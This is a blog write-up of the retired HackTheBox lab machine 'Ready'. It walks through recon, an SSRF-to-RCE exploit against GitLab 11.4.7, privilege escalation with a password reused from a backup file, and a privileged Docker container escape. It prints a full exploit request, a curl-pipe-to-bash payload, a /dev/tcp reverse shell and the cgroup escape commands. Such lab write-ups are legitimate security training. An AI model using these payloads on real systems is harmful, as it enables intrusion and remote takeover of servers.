
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="This is a writeup about a retired HacktheBox machine: Ready published on December 12 2020 by bertolis This box is classified as a medium machine. This box implies an outdated gitlab server, a clear text password in a backup file and a docker container." name="description"/>
<meta content="security, boot2root, HTB, gitlab, docker" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Ready" property="og:title"/>
<meta content="This is a writeup about a retired HacktheBox machine: Ready published on December 12 2020 by bertolis This box is classified as a medium machine. This box implies an outdated gitlab server, a clear text password in a backup file and a docker container." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2021/05/htb-ready.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2021-05-16 09:20:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="gitlab" property="article:tag"/>
<meta content="docker" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Ready</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-ready">HTB: Ready</h1>
<p>
      Posted on 16 May 2021 in <a href="../../category/security.html">security</a>

        • 4 min read
    </p>
</header>
<div>
<p><img alt="Ready card" class="align-left" src="/media/2021.05/ready_card.png" width="262"/></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/304">Ready</a> published on
December 12 2020 by
<a href="https://www.hackthebox.com/home/users/profile/27897">bertolis</a>
This box is classified as a medium machine. This box implies an outdated gitlab
server, a clear text password in a backup file and a docker container.</p>
<h1>User</h1>
<h2>Recon</h2>
<p>We start with an nmap scan. Only port 22 (SSH) and port 5080 (HTTP) are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.91 scan initiated Sun Dec 13 03:40:16 2020 as: nmap -p- -sSV -oN nmap 10.129.29.192
Nmap scan report for 10.129.29.192
Host is up (0.014s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 13 03:40:48 2020 -- 1 IP address (1 host up) scanned in 31.28 seconds
</code></pre></div>
<h2>Web</h2>
<p>The HTTP service is once again a gitlab (my latest rooted box is
<a href="/2021/05/htb-laboratory.html">laboratory</a>) server. This time the version is 11.4.7. A Google
research "gitlab 11.4.7 exploit" lead us to a
<a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">blog article about an RCE on gitlab during a CTF</a></p>
<p>Following the blog exploitation we end up with a request looking like the
following and can validate the RCE using a python server on our kalibox.</p>
<div class="highlight"><pre><span></span><code>POST /projects HTTP/1.1
Host: 10.129.29.192:5080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.29.192:5080/projects/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 1073
Origin: http://10.129.29.192:5080
Connection: close
Cookie: _gitlab_session=140270c33fe803d8ab11d0f9a85c45cf; sidebar_collapsed=false
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&amp;authenticity_token=%2BEHyUYosjkfZlzfMEpR8QFZ%2BWiJMAQQ%2BTiB3Wt%2FNK0fNBNX9EhAKd6VM6okCvVQ0fZ6HxSBzQdo%2Fx4Lfe4nDCw%3D%3D&amp;project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7C%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%38%3a%38%30%30%30%2f%72%65%76%32%2e%73%68%20%7c%20%62%61%73%68%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=&amp;project%5Bnamespace_id%5D=6&amp;project%5Bpath%5D=ttreqqq139&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
</code></pre></div>
<p>We can even just manually import a git project using the following "git url":
<code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Cxxxxxxxxx%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git</code> and replacing the payload <code>xxxxxxxxxxx</code> with our own URL encoded.</p>
<p>We send the following payload <code>curl http://10.10.14.18:8000/rev2.sh | bash</code>.</p>
<p>The content of rev2.sh is the following:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.14.18/4443<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div>
<p>We run a netcat listener to catch our reverse shell. We end up with a shell as
<code>git</code> that can read the user flag.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~$ nc -l -p 4443
bash: cannot set terminal process group (485): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$ id
id
uid=998(git) gid=998(git) groups=998(git)
git@gitlab:/$ find / -name 'user.txt' 2&gt;/dev/null
find / -name 'user.txt' 2&gt;/dev/null
/home/dude/user.txt
git@gitlab:/$ cat /home/dude/user.txt
cat /home/dude/user.txt
e1e30b052b6ec0670698805d745e7682
</code></pre></div>
<h1>Root</h1>
<h2>Enumeration</h2>
<p>We enumerate a few file and find the <code>/opt/backup/</code> directory which contain a few
files. The file <code>gitlab.rb</code> contain a smtp password.</p>
<div class="highlight"><pre><span></span><code>git@gitlab:/opt/backup$ grep -i pass gitlab.rb
grep -i pass gitlab.rb
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
    gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 &lt;dbuser&gt;`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil
</code></pre></div>
<p>We need an interactive shell to be able to input a password, we use python for
that purpose and end up with a shell as root.</p>
<div class="highlight"><pre><span></span><code>git@gitlab:~/gitlab-rails/working$ python3 -c 'import pty; pty.spawn("/bin/bash")'
&lt;orking$ python3 -c 'import pty; pty.spawn("/bin/bash")'
git@gitlab:~/gitlab-rails/working$ su
su
Password: wW59U!ZKMbG9+*#h

root@gitlab:/var/opt/gitlab/gitlab-rails/working# id
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div>
<p>Nonetheless we cannot find any <code>root.txt</code> file. As you probably already guess or
notice we are in a docker container.</p>
<h2>Docker escape</h2>
<p>We run <a href="https://github.com/stealthcopter/deepce">deepce</a>: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
We use a python server on our kalibox to transfer the script using <code>wget --recursive --no-parent http://10.10.14.18:8000</code>.
And we run it.</p>
<div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
[+] Privileged Mode ......... Yes
The container appears to be running in privilege mode, we should be able to access the
raw disks and mount the hosts root partition in order to gain code execution.
See https://stealthcopter.github.io/deepce/guides/docker-privileged.md
&lt;SNIP&gt;
</code></pre></div>
<p>An other quick Google research allow us to find a <a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">medium article</a>
to learn more about docker's privilege mode with a few command line to execute a
command on the system. We just replace the <code>echo "ps aux &gt; $host_path/output" &gt;&gt; /cmd</code> line
with <code>echo "cat /root/root.txt &gt; $host_path/output" &gt;&gt; /cmd</code> and grab the root
hash.</p>
<div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
root@gitlab:/tmp/.plop# echo "cat /root/root.txt &gt; $host_path/output" &gt;&gt; /cmd
echo "cat /root/root.txt &gt; $host_path/output" &gt;&gt; /cmd
root@gitlab:/tmp/.plop# sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
root@gitlab:/tmp/.plop# cat /output
cat /output
b7f98681505cd39066f67147b103c2b3
</code></pre></div>
<h1>Wrapping up</h1>
<p>The box is not that hard (less than <a href="/2021/05/htb-laboratory.html">laboratory</a>) and quit interesting
as the exploitation of the gitlab's SSRF and its upgrade to an RCE was really
interesting and detailed on the blog article.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/gitlab.html">gitlab</a>
<a href="../../tag/docker.html">docker</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2021/04/htb-time.html" title="HTB: Time">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2021/05/htb-laboratory.html" title="HTB: Laboratory">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>